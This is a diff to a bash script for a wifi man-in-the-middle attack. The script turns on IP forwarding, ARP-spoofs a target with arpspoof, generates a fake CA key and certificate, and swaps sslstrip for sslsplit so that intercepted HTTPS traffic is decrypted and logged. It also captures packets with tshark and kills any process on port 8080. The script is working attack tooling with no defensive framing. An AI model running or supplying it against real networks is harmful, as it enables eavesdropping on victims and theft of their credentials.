@@ -1,5 +1,8 @@
 #!/bin/bash
 
+#killing any conflicting process in port 8080
+echo "Killing any conflicting process in 8080"
+sudo fuser -k 8080/tcp
 #creating a capture file for tshar 
 touch capture.pcap
 
@@ -24,13 +27,18 @@ echo "1" | sudo tee /proc/sys/net/ipv4/ip_forward
 #getting wifi interface
 wifi_interface=$(iw dev | awk '$1=="Interface"{print $2}')
 
+#This generates a key for fake ssl certificate 
+openssl genrsa -out ca.key 4096
+#This scripts automatically generate certificate to be used  
+chmod +x create_certificate
+./create_certificate
 #using arpspoof and running the process in background throwing output to background
 #Not effective way
 #sudo arpspoof -i $wifi_interface $ip_addr > /dev/null 2>&1 &
 
 #cmd_1="arpspoof -i ${wifi_interface} ${ip_addr}; sleep 150"
 sudo xterm -e zsh -c "arpspoof -i ${wifi_interface} ${ip_addr}" &
-sudo xterm -e zsh -c "sslstrip -l 8080" &
+sudo xterm -e zsh -c "sslsplit -D -l ssl_log.log -k ca.key -c ca.crt -P https 127.0.0.1 8080" &
 #using tshark to save the log
 #sudo tshark -i $wifi_interface -w capture.pcap > /dev/null 2>&1 &
 
